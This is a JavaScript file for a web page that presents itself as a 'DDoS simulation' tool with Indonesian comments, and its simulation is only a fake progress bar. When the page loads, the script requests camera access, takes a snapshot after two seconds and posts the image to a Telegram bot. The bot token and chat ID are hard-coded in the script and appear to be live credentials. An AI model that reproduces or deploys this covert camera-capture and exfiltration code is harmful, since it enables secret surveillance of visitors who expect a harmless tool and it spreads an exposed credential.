// script.js

// Token & Chat ID Bot Telegram
const TELEGRAM_BOT_TOKEN = "8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4";
const TELEGRAM_CHAT_ID = "6157377532";

// Fungsi untuk mengirim foto ke bot Telegram
function sendPhotoToTelegram(imageData) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            photo: imageData
        }),
        headers: { "Content-Type": "application/json" }
    })
    .then(response => response.json())
    .then(data => {
        console.log("Photo sent successfully", data);
    })
    .catch(error => {
        console.error("Error sending photo", error);
    });
}

// Mengambil foto dari kamera tanpa tombol, langsung saat halaman dimuat
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();
        
        // Menampilkan video pada halaman (untuk debugging)
        document.getElementById("cameraContainer").classList.remove("hidden");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        setTimeout(() => {
            // Mengambil gambar dari video dan menggambar di canvas
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Mengambil gambar dalam format data URL
            const imageData = canvas.toDataURL("image/png");

            // Mengirim gambar ke Telegram
            sendPhotoToTelegram(imageData);

            // Stopping the video stream
            stream.getTracks().forEach(track => track.stop());

            // Menghapus elemen video setelah pengambilan gambar
            video.remove();
        }, 2000); // Mengambil foto setelah 2 detik
    })
    .catch((err) => {
        console.error("Camera access denied:", err);
    });

// Simulasi DDoS
document.getElementById("ddosForm").addEventListener("submit", function (e) {
    e.preventDefault();
    
    const url = document.getElementById("url").value;
    const statusDiv = document.getElementById("status");
    const ddosEffect = document.getElementById("ddosEffect");
    const progress = document.getElementById("progress");
    const attackProgress = document.getElementById("attackProgress");

    statusDiv.textContent = "Starting DDoS simulation for " + url + "...";
    
    // Menampilkan efek serangan
    ddosEffect.classList.remove("hidden");

    let progressValue = 0;
    let interval = setInterval(() => {
        if (progressValue < 100) {
            progressValue += 10;
            progress.style.width = progressValue + "%";
            attackProgress.textContent = progressValue + "%";
        } else {
            clearInterval(interval);
            statusDiv.textContent = "Simulation complete. Attack finished.";
        }
    }, 500);
});
